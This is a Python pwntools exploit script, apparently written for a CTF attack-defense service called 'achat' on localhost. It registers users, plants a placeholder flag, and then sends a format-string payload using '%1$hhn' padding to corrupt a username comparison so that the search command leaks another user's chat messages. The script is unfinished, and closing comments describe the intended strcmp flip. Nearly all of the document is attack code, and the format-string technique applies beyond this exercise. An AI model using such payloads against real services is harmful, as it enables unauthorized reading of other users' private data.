#!/bin/python3
from binascii import hexlify
from os import replace
from random import choice
from pwn import *
from string import ascii_letters, ascii_uppercase


context.update(arch='amd64', os='linux')

context.log_level = 'debug'

context.update(binary="./../achat/bin/achat")
URL = "localhost"
PORT = 1337

# elf: ELF = ELF(context.binary)

def rand_string(length):
    return ''.join(choice(ascii_letters) for i in range(length))


def send_and_recv(msg):
    p = connect(URL, PORT)
    p.sendlineafter(b"$", bytes(msg, 'ascii'))
    p.shutdown()
    resp = p.recvall()
    p.close()
    return resp

def main(strart_idx):
    # register "flag user..."
    flag_uname = "flag" + rand_string(5)
    flag_passwd = rand_string(7)

    # register
    resp = send_and_recv(f"register {flag_uname} {flag_passwd}".format()).decode()
    if "SessionID: " not in resp:
        exit(1)

    flag_sessionID = resp[len("SessionID: "):-3]

    # create chat
    send_and_recv(f"start-chat {flag_sessionID} {flag_uname}".format())
    # send exploit
    resp = send_and_recv(f"send {flag_sessionID} {flag_uname}&{flag_uname} FAUST_THIS_IS_A_FALG".format())







    # register
    uname = "a" + flag_uname[1:]
    passwd = rand_string(7)

    resp = send_and_recv(f"register {uname} {passwd}".format()).decode()
    if "SessionID: " not in resp:
        exit(1)
    sessionID = resp[len("SessionID: "):-3]
    # create chat
    send_and_recv(f"start-chat {sessionID} {uname}".format())
    # send exploit
    msg = "A"*0xbb + "A" * 0x66 + "%1$hhn"
    resp = send_and_recv(f"send {sessionID} {uname}&{uname} {msg}".format())
    # search (get leak)
    resp = send_and_recv(f"search {sessionID} {msg[0]}".format()).decode()
    print(resp)
    
    # send formatstring that attacks the uname in tne search chat function
    # so that in search chat the strcmp gets flipped 



if __name__ == "__main__":
    main(0x30)
